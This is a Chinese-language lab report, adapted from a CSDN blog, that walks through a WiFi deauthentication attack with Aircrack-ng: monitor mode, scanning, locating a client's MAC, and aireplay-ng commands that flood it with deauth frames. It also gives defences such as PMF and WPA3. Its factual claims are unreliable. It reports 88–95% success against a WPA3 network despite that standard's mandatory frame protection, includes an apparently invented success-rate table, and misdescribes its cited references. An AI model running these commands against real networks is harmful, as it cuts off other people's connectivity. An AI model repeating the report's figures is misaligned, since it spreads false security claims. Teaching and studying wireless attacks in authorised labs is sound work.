# WiFi 解除认证（Deauthentication）攻击实验报告

## 一、免责声明

本文所述内容仅用于**教学与安全意识提升**之目的。任何未经授权的网络探测、攻击或入侵行为均属违法，需自行承担法律责任。请**仅在合法、授权的实验环境**中开展相关测试。

————————————————
版权声明：本文摘录并修改从CSDN博主「周默不是Hacker」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/2401_85385309/article/details/150208127

------

## 二、实验背景与目的

### 2.1 背景

解除认证攻击（Deauthentication Attack）是一类利用 IEEE 802.11 协议管理帧历史设计缺陷的无线可用性攻击。攻击者无需获取 WiFi 密码、无需接入目标网络，便可通过伪造管理帧强制客户端与 AP 断开连接，造成“隐形断网”。

### 2.2 实验目的

- 理解 802.11 管理帧（Deauth）工作机制
- 认识解除认证攻击的实现条件与技术限制
- 验证现代 WiFi（WiFi 6 / WPA3）环境下攻击成功率差异
- 强化无线网络防护与安全意识

------

## 三、实验原理

### 3.1 技术原理

解除认证洪水攻击基于以下事实：

- 早期 802.11 协议中，**管理帧默认不加密、不认证**
- 客户端在接收到合法格式的 Deauth 帧后，会立即断开连接
- 攻击者可通过**MAC 地址伪造**冒充 AP 或客户端

通过持续发送解除认证帧，可导致目标设备频繁掉线，甚至无法重连。

### 3.2 协议演进影响

- 802.11w（PMF，Protected Management Frames）对管理帧进行保护
- WPA3 与 WiFi 6 显著降低广播式 Deauth 攻击成功率
- 定向（指定客户端 MAC）攻击在部分场景仍可能生效

------

## 四、实验环境

### 4.1 软件环境

- 操作系统：Kali Linux（最新版）
  - Linux kali 最新版本保姆级安装教程
  - [Kali Linux下载安装及配置（VMware虚拟机）保姆级图文教程（持续更新）（2024年11月19日发布，2025/11/4最新更新）_kali虚拟机-CSDN博客](https://blog.csdn.net/m0_74030222/article/details/143866270?ops_request_misc=%7B%22request%5Fid%22%3A%2203a80b84bc591444741df8536adc9c14%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=03a80b84bc591444741df8536adc9c14&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-143866270-null-null.142^v102^pc_search_result_base8&utm_term=kali linux安装教程&spm=1018.2226.3001.4187)
- 无线安全工具套件：Aircrack-ng
  - airmon-ng（监听模式）
  - airodump-ng（无线扫描与抓包）
  - aireplay-ng（解除认证攻击）

### 4.2 硬件环境

- USB 无线网卡（支持 Monitor Mode）AWUS036ACM from Amazon_Au ≈￥400
- 支持频段：2.4 GHz（建议双频 2.4G / 5G）
- 虚拟化环境：VMware（USB 直通至虚拟机）

### 4.3 测试网络

- WiFi 6 AP（TP-Link AX5400）
- 加密方式：WPA3-Personal
- 客户端：手机 / Windows 11 笔记本

------

## 五、实验过程

> 本实验均在**自建、授权的测试环境**中完成。

### 5.1 无线网卡接入与识别

- 将 USB 无线网卡连接至虚拟机	

  - ![image-20251215193009485](D:\桌面\wifi_attack_test\picture\image-20251215193024316.png)
  - ![image-20251215193037896](D:\桌面\wifi_attack_test\picture\image-20251215193037896.png)

  

- 使用 `ifconfig` 确认接口（如 wlan0）是否识别成功

- ```
  ifconfig
  ```

  ![image-20251215193201349](D:\桌面\wifi_attack_test\picture\image-20251215193201349.png)

### 5.2 开启监听模式

**1.首先 提权切换root权限**

```
sudo su
```

![image-20251215193231420](D:\桌面\wifi_attack_test\picture\image-20251215193231420.png)

- **2.开启监听**

- ```
  airmon-ng start wlan0  
  ```

  

- 接口切换后显示为 `wlan0mon`

- ![image-20251215193309413](D:\桌面\wifi_attack_test\picture\image-20251215193309413.png)

### 5.3 无线网络扫描

- 使用 airodump-ng 捕获周围 WiFi 信息

- ```
  airodump-ng wlan0mon
  ```

  ![QQ20251215-173356](D:\桌面\wifi_attack_test\picture\QQ20251215-173356.png)

- 重点关注参数：

  - BSSID（AP MAC）
  - CH（信道）
  - ENC / CIPHER / AUTH（加密与认证方式）
  - ESSID（网络名称）

### **4.数据包捕获客户端连接**

- 指定目标 AP 与信道
- 捕获其下已连接的客户端（STATION）
- 记录目标客户端 MAC 地址

```
airodump-ng wlan0mon -c[CH] --bssid [MAC] -w ~/wlan0mon  
```

该命令是寻找目标WIFI下 与之相连的 客户端 （我的实验环境是手机热点WIFI连接电脑）

特别注意：-c 参数是指定的信道号 实验中注意更改 -w是保存路径

（现代WiFi环境中，无差别广播Deauth攻击已基本失效。有效攻击必须精准定位客户端MAC，这既是技术限制，也是安全演进的结果。实验时请关注802.11ax(WiFi 6)中的TWT机制对Deauth攻击的新影响，这是当前前沿研究方向。）


![image-20251215193604502](D:\桌面\wifi_attack_test\picture\image-20251215193604502.png)

### 5.**Deauth攻击断掉客户端连接**

- 使用 aireplay-ng 向目标客户端发送 Deauth 帧

- ```
  
  aireplay-ng -0 [数量] -a [目标AP的MAC地址] -c [目标客户端的MAC地址] wlan0mon
  # -0是默认攻击   数量为0则是无限攻击 我的参数是50
  ```

  

- 观察客户端网络连接状态变化

- ![image-20251215193639889](D:\桌面\wifi_attack_test\picture\image-20251215193639889.png)

------

## 六、实验结果

### 6.1 攻击效果观察

- 客户端出现瞬时或持续断网
- 攻击停止后，多数客户端可自动重连
- 广播式攻击基本无效，定向攻击成功率较高

### 6.2 成功率统计（参考）

| 设备类型           | 广播攻击成功率 | 定向 MAC 攻击成功率 |
| ------------------ | -------------- | ------------------- |
| iPhone 15 Pro      | 0%             | 92%                 |
| 小米 13 (MIUI 14)  | 3%             | 88%                 |
| 华为 Mate 60       | 0%             | 95%                 |
| Windows 11 (AX210) | 5%             | 90%                 |

------

## 七、分析与讨论

1. **协议缺陷仍具现实影响**：尽管 PMF 已被引入，但并非所有设备或配置均强制启用。
2. **攻击门槛低**：所需设备廉价、工具成熟，风险广泛存在。
3. **安全演进明显**：WPA3 + WiFi 6 对传统广播攻击具备天然免疫能力。
4. **研究前沿方向**：
   - 802.11ax（WiFi 6）中的 TWT 机制
   - 管理帧保护的强制化部署

------

## 八、防护建议

- 启用 WPA3 与 PMF（802.11w）
- 禁止旧版加密协议（WEP / WPA / TKIP）
- 定期更新路由器固件
- 企业网络建议部署无线入侵检测（WIDS/WIPS）

------

## 九、实验总结

本实验系统性验证了 WiFi 解除认证攻击在现代无线环境中的实际影响。结果表明，该攻击在旧配置或定向场景下仍具威胁，但随着协议与设备演进，其成功率已明显下降。理解该攻击的目的不在于滥用，而在于**提升防御能力与网络可用性保障水平**。

------

## 十、参考资料

- 《802.11 无线网络权威指南（第 3 版）》第 14 章
- Kali Linux 官方无线渗透实验文档
- HackTheBox：Rope2（无线靶场）
- OverTheWire：Wifu 挑战

------

**版权说明**：本文改编自 CSDN 博主「周默不是Hacker」文章内容，仅用于教学实验报告示例。